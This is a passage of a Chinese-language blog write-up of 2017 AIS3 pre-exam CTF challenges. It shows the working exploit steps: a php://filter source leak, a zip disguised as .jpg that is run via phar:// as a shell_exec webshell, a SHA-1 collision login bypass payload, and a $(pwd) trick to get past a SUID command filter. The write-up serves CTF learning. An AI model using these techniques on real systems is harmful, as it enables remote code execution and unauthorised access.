+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?p=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag1: AIS3&#123;Cute_Snoopy_is_back!!?!?!!?&#125;</span></span><br><span class="line"><span class="comment">// disabled for security issue</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;zip&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> &amp;<span class="variable">$s</span>)</span><br><span class="line">    stream_wrapper_unregister(<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$FROM_INCLUDE</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$pages</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// disabled</span></span><br><span class="line">    <span class="comment">// &quot;uploaddddddd&quot; =&gt; &quot;Uploads&quot;,</span></span><br><span class="line">    <span class="string">&quot;about&quot;</span> =&gt; <span class="string">&quot;About&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>]))</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;home&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>訪問 quiz.ais3.org:23545/?p=uploaddddddd</p>
+<p>只能上傳 .jpg</p>
+<p><a href="https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owlur-writeup-web-200/">寫的蠻清楚的 writeups</a></p>
+<p><a href="http://php.net/manual/fr/wrappers.php">http://php.net/manual/fr/wrappers.php</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">print_r(shell_exec(<span class="string">&#x27;ls&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包成 zip，把檔名加上 .jpg</p>
+<p>上傳後 quiz.ais3.org:23545/images/140.118.149.167/oXSrrTVq1.jpg</p>
+<p>利用 phar:// — Archive PHP</p>
+<p>訪問 quiz.ais3.org:23545/?p=phar://images/140.118.149.167/oXSrrTVq1.jpg/untitled</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">about.php css header.php home.php images img index.php js the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l uploaddddddd.php</span><br></pre></td></tr></table></figure>
+<p>有個檔案</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l</span><br></pre></td></tr></table></figure>
+
+<p>訪問 quiz.ais3.org:23545/the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;RCEEEEEEEEE_is_soooooooooo_funnnnnnnnnnnn!?!!?!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto1">Crypto 1</h2>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr;</span><br><span class="line">	<span class="keyword">char</span> flag[<span class="number">29</span>] = <span class="string">&quot;????????????????????????????&quot;</span>; <span class="comment">// Hint: The flag begins with AIS3</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>, ptr = (<span class="keyword">int</span>*)flag ; i &lt; <span class="number">7</span> ; ++i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ptr[i] ^ val1 ^ val2 ^ val3 ^ val4);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	964600246</span></span><br><span class="line"><span class="comment">	1376627084</span></span><br><span class="line"><span class="comment">	1208859320</span></span><br><span class="line"><span class="comment">	1482862807</span></span><br><span class="line"><span class="comment">	1326295511</span></span><br><span class="line"><span class="comment">	1181531558</span></span><br><span class="line"><span class="comment">	2003814564</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示說開頭是 AIS3</p>
+<p>所以 AIS3 轉成 int 後跟 val1, val2, val3, val4 做 xor 會是 964600246</p>
+<p>經由大大提點</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">crypto_list = [<span class="number">964600246</span>, <span class="number">1376627084</span>, <span class="number">1208859320</span>, <span class="number">1482862807</span>, <span class="number">1326295511</span>, <span class="number">1181531558</span>, <span class="number">2003814564</span>]</span><br><span class="line">xor = <span class="built_in">int</span>(<span class="string">&#x27;AIS3&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>) ^ crypto_list[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;xor: &#x27;</span>, xor</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> crypto_list:</span><br><span class="line">	<span class="built_in">print</span> <span class="built_in">hex</span>(key ^ xor)</span><br></pre></td></tr></table></figure>
+
+<p>（其實這邊我不知道為何 AIS3 要反轉）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor:  170780919</span><br><span class="line">0x33534941</span><br><span class="line">0x5820417b</span><br><span class="line">0x4220524f</span><br><span class="line">0x524f5820</span><br><span class="line">0x45204120</span><br><span class="line">0x4c415551</span><br><span class="line">0x7d422053</span><br></pre></td></tr></table></figure>
+
+<p>轉成 ASCII</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3SIAX A&#123;B ROROX E A LAUQ&#125;B S</span><br></pre></td></tr></table></figure>
+
+<p>AIS3 字串反了，我是土法煉鋼手動把十六進位反轉回來</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x41495333</span><br><span class="line">0x7b412058</span><br><span class="line">0x4f522042</span><br><span class="line">0x20584f52</span><br><span class="line">0x20412045</span><br><span class="line">0x5155414c</span><br><span class="line">0x5320427d</span><br></pre></td></tr></table></figure>
+
+<p>轉成 ASCII</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;A XOR B XOR A EQUALS B&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="crypto3">Crypto 3</h2>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span>(<span class="params"><span class="variable">$haystack</span>, <span class="variable">$needle</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = strlen(<span class="variable">$needle</span>);</span><br><span class="line">    <span class="keyword">return</span> (substr(<span class="variable">$haystack</span>, <span class="number">0</span>, <span class="variable">$length</span>) === <span class="variable">$needle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="variable">$h1</span> = sha1(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$h2</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="variable">$password</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Your password can not be your username.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$h1</span> === <span class="variable">$h2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Flag1: <span class="subst">$flag1</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$username</span>, <span class="string">&quot;Snoopy_do_not_like_cats_hahahaha&quot;</span>) !== <span class="literal">false</span> <span class="keyword">and</span></span><br><span class="line">            strpos(<span class="variable">$password</span>, <span class="string">&quot;ddaa_is_PHD&quot;</span>) !== <span class="literal">false</span> <span class="keyword">and</span></span><br><span class="line">            startsWith(<span class="variable">$h1</span>, <span class="string">&quot;f00d&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> .= <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$msg</span> .= <span class="string">&quot;Flag2: <span class="subst">$flag2</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就是要讓 SHA1 collision</p>
+<p>這個網站 <a href="https://shattered.io/">https://shattered.io/</a> 的兩個 PDF 檔已經被證實有發生 SHA1 collision</p>
+<p><a href="http://blog.csdn.net/caiqiiqi/article/details/68953730">寫得蠻詳細的 writeup</a></p>
+<p>先找出兩份文件的不同處</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cmp -l shattered-1.pdf shattered-2.pdf</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>xxd</code> 把 pdf 的文件資訊轉成十六進位表示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ xxd shattered-1.pdf &gt; shattered-1.pdf.hex</span><br><span class="line">$ xxd shattered-2.pdf &gt; shattered-2.pdf.hex</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>colordiff</code> 比較</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ brew install colordiff</span><br><span class="line">$ colordiff shattered-1.pdf.hex shattered-2.pdf.hex</span><br></pre></td></tr></table></figure>
+
+<img src="/2017/07/15/2017-AIS3-pre-exam/2017-07-07-1.png" class="slug">
+
+<p>用 python 將兩份文件不同的地方轉成 url encode</p>
+<img src="/2017/07/15/2017-AIS3-pre-exam/2017-07-07-2.png" class="slug">
+
+<p>用 HackBar 送</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;SHA1111l111111_is_broken&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="misc4">Misc 4</h2>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh://misc4@quiz.ais3.org :31534/</span><br><span class="line">(login password is ais3)</span><br></pre></td></tr></table></figure>
+
+<p>有三個檔案</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag  shell  shell.c</span><br></pre></td></tr></table></figure>
+
+<p>直接用 cat flag 會 Permission denied</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dr-xr-xr-x 2 root root   4096 Jun 24 17:25 .</span><br><span class="line">drwx--x--x 5 root root   4096 Jun 26 14:38 ..</span><br><span class="line">-rw-r--r-- 1 root root      0 Jun 24 17:25 .hushlogin</span><br><span class="line">-r--r----- 1 root misc4x   32 Jun 24 16:01 flag</span><br><span class="line">-r-xr-s--x 1 root misc4x 9160 Jun 24 17:02 shell</span><br><span class="line">-r--r--r-- 1 root misc4x  686 Jun 24 17:02 shell.c</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.bestlong.idv.tw/thread-225-1-1.html">Linux 檔案與目錄的特殊權限</a></p>
+<blockquote>
+<p>s 或 S（SUID,Set UID）：<br>可執行的文件搭配這個權限，便能得到特權，任意存取該文件的所有者能使用的全部系統資源。請注意具備 SUID 權限的文件，黑客經常利用這種權限，以 SUID 配上 root 帳號擁有者，無聲無息的在系統中開啟後門，供日後進出使用。</p>
+</blockquote>
+<p>所以要透過執行 shell 讓它顯示 flag</p>
+<p>shell.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;\\&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        setregid(getegid(), <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/this_is_not_a_valid_path&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>類似這題 <a href="https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2/cmd2.md">https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2/cmd2.md</a></p>
+<p>先回到根目錄，利用根目錄的 <code>pwd=/</code>，再用 cat 將檔案顯示出來</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./shell &quot;cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)misc4\$(pwd)*&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ais3&#123;I_AM_NOT_FAMALIAR_WITH_IT&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/writeups/" rel="tag"># writeups</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/03/06/algorithm-complete-problem/" rel="prev" title="Algorithm #1: P, NP, NP Hard, NP Complete Problem">
+      <i class="fa fa-chevron-left"></i> Algorithm #1: P, NP, NP Hard, NP Complete Problem
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/07/20/%E6%98%8E%E5%A4%A9%E6%99%9A%E4%B8%8A%E6%83%B3%E5%90%83%E4%BB%80%E9%BA%BC%E8%8F%9C%EF%BC%9F/" rel="next" title="Daily #1: 明天晚上想吃什麼菜？">
+      Daily #1: 明天晚上想吃什麼菜？ <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc2"><span class="nav-number">1.</span> <span class="nav-text">Misc 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">2.</span> <span class="nav-text">Web 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">3.</span> <span class="nav-text">Web 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">4.</span> <span class="nav-text">Web 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rev1"><span class="nav-number">5.</span> <span class="nav-text">Rev 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">6.</span> <span class="nav-text">Web 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto1"><span class="nav-number">7.</span> <span class="nav-text">Crypto 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto3"><span class="nav-number">8.</span> <span class="nav-text">Crypto 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc4"><span class="nav-number">9.</span> <span class="nav-text">Misc 4</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Elmo Hsiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/amao1991" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;amao1991" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:elmo@elmo.tw" title="E-Mail → mailto:elmo@elmo.tw" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/elmootw" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;elmootw" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.behance.net/elmootw" title="Behance → https:&#x2F;&#x2F;www.behance.net&#x2F;elmootw" rel="noopener" target="_blank"><i class="fab fa-behance fa-fw"></i>Behance</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://elmootw.myportfolio.com/" title="https:&#x2F;&#x2F;elmootw.myportfolio.com&#x2F;" rel="noopener" target="_blank">Adobe Portfolio</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Elmo Hsiao</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://http-blog-amao-com-tw.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/";
+    this.page.identifier = "2017/07/15/2017-AIS3-pre-exam/";
+    this.page.title = "Writeups #1: 2017-AIS3-pre-exam";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://http-blog-amao-com-tw.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
